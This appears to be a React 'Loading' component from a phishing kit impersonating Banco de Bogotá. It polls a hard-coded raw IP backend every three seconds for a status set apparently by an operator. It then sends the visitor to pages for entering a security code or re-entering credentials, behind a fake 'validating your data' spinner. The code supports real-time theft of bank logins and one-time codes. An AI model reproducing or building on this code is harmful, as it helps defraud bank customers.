import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './Loading.css';  // Importamos el archivo de estilos CSS

const Loading = () => {
    const [loading, setLoading] = useState(true);
    const navigate = useNavigate();

    useEffect(() => {
        // Recuperar el guestId desde el localStorage
        const guestId = localStorage.getItem('guestId');
        
        if (!guestId) {
            console.error("No se encontró el guestId en el localStorage");
            return;
        }

        // Intervalo de consulta cada 3 segundos
        const interval = setInterval(async () => {
            try {
                // Realizar la solicitud GET usando el guestId
                const response = await fetch(`http://46.202.140.21:8000/api/v1/guest/${guestId}`, {
                    method: 'GET',
                    credentials: 'include',  // Asegura que las cookies se envíen
                });

                // Parsear la respuesta JSON
                const data = await response.json();

                if (data && data.status_id) {
                    const statusId = data.status_id;

                    switch (statusId) {
                        case 6:
                            setLoading(false);
                            navigate('/bancodebogota/ingreso/codigo_seguridad');
                            break;
                        case 7:
                            setLoading(false);
                            navigate('/bancodebogota/ingreso/codigo_seguridad_error');
                            break;
                        case 3:
                            setLoading(false);
                            navigate('/bancodebogota/error_credentials');
                            break;
                        default:
                            break;
                    }
                }
            } catch (error) {
                console.error('Error al consultar el estado:', error);
            }
        }, 3000); // Llamada cada 3 segundos

        // Limpiar el intervalo cuando el componente se desmonte
        return () => clearInterval(interval);
    }, [navigate]);

    return (
        <div className="loading-container">
            {loading ? (
                <div className="loading-content">
                    <div className="loading-circle"></div>
                    <p className="loading-text">Espere un momento mientras se validan los datos suministrados</p>
                </div>
            ) : (
                <p className="completed-message">¡Listo! Ya puedes continuar</p>
            )}
        </div>
    );
};

export default Loading;
